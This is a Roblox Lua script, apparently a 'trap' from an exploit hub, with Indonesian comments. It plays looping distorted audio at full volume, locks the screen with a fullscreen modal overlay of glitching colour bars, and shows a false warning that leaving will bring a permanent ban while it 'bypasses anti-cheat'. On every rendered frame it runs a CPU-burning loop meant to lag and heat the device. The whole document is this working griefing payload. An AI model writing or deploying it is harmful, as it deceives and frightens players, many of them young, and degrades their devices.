-- [[ DekaTeamHub: ABSOLUTE SOUND INJECTION ]] --
task.spawn(function()
    local SS = game:GetService("SoundService")
    
    -- 1. AUDIO BYPASS (PAKE ID YANG PASTI JALAN)
    local function PlayExtreme()
        local s = Instance.new("Sound")
        -- ID INI BIASANYA STABIL (TACO ATAU DISTORTED NOISE)
        s.SoundId = "rbxassetid://142276005" 
        s.Volume = 10
        s.Looped = true
        s.Parent = SS
        
        -- PAKSA PLAY LEWAT LOCAL ENGINE (METODE PALING KERAS)
        task.spawn(function()
            while true do
                if not s.IsPlaying then
                    s:Play()
                    pcall(function() SS:PlayLocalSound(s) end)
                end
                task.wait(0.1)
            end
        end)
    end
    
    PlayExtreme()

    -- 2. LOCK DOWN & VISUAL (VIDEO SYNC)
    local PG = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    local screen = Instance.new("ScreenGui", PG)
    screen.Name = "DekaFinalTrap"
    screen.DisplayOrder = 2147483647
    screen.IgnoreGuiInset = true

    local B = Instance.new("TextButton", screen)
    B.Size = UDim2.new(1, 0, 1, 0)
    B.BackgroundColor3 = Color3.new(0, 0, 0)
    B.Modal = true
    B.Text = ""

    local Bars = Instance.new("Frame", B)
    Bars.Size = UDim2.new(1, 0, 1, 0)
    local colors = {
        Color3.fromRGB(191,191,191), Color3.fromRGB(191,191,0),
        Color3.fromRGB(0,191,191), Color3.fromRGB(0,191,0),
        Color3.fromRGB(191,0,191), Color3.fromRGB(191,0,0),
        Color3.fromRGB(0,0,191)
    }
    for i, c in pairs(colors) do
        local f = Instance.new("Frame", Bars)
        f.Size = UDim2.new(1/#colors, 0, 1, 0)
        f.Position = UDim2.new((i-1)/#colors, 0, 0, 0)
        f.BackgroundColor3 = c
        f.BorderSizePixel = 0
    end

    local T = Instance.new("TextLabel", B)
    T.Size = UDim2.new(0.8, 0, 0.4, 0)
    T.Position = UDim2.new(0.1, 0, 0.3, 0)
    T.BackgroundTransparency = 1
    T.TextColor3 = Color3.new(1, 1, 1)
    T.TextScaled = true
    T.Font = "Code"
    T.Text = "SABAR TUNGGU 1 JAM!\nJANGAN LEAVE ATAU BAN PERMANENT!!\n\nBYPASSING ANTI-CHEAT ROBLOX..."

    -- 3. GLITCH & LAG ENGINE
    game:GetService("RunService").RenderStepped:Connect(function()
        Bars.Position = UDim2.new(0, math.random(-15, 15), 0, math.random(-15, 15))
        if math.random(1, 4) == 1 then
            local n = Instance.new("Frame", B)
            n.Size = UDim2.new(1, 0, 0, math.random(2, 40))
            n.Position = UDim2.new(0, 0, math.random(0, 100)/100, 0)
            n.BackgroundColor3 = Color3.new(1, 1, 1)
            n.BackgroundTransparency = 0.4
            task.delay(0.01, function() n:Destroy() end)
        end
        -- LAG MAUT (HP PANAS)
        for i = 1, 3500000 do local _ = i * i end
    end)
end)


















